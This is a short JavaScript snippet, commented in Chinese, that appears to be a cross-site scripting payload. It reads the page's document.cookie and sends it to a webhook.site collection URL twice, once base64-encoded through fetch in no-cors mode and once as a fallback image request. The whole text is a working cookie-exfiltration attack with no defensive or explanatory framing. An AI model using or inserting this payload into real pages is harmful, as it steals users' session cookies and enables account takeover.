var webhook = "https://webhook.site/4d5c5aed-b420-44a8-9a20-d976e811ca3e?";

// 发送 Cookie
fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });

// 备用方案
new Image().src = webhook + "c=" + document.cookie;
